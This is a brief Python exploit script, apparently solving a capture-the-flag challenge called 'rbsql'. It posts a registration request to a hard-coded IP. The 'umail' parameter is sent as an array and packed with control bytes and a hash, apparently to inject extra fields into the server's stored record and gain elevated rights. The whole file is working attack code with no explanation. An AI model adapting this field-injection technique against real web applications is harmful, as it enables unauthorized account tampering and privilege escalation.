#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

url = "http://192.168.186.131/"
url = "http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/"

def join():
    data = {
        "uid": "lyle",
        "umail[]": "\x20a87ff679a2f3e71d9181a67b7542122c\x01\x0d192.168.186.1\x01\x012",
        "upw": "1"
    }
    requests.post(url + "?page=join_chk", data)

if __name__ == '__main__':
    join()